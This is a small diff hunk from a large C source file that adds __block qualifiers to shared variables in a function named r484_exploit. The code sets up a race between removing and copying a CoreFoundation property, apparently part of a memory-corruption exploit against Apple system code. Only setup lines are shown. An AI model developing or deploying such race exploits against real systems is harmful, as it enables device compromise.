@@ -20947,9 +20947,9 @@ static void r484_exploit(void) {
             CFRelease(val);
 
             /* Race: remove vs copy */
-            volatile int prop_go = 0;
-            volatile CFTypeRef read_val = NULL;
-            volatile int remove_done = 0;
+            __block volatile int prop_go = 0;
+            __block volatile CFTypeRef read_val = NULL;
+            __block volatile int remove_done = 0;
 
             /* Thread A: remove the property */
             dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
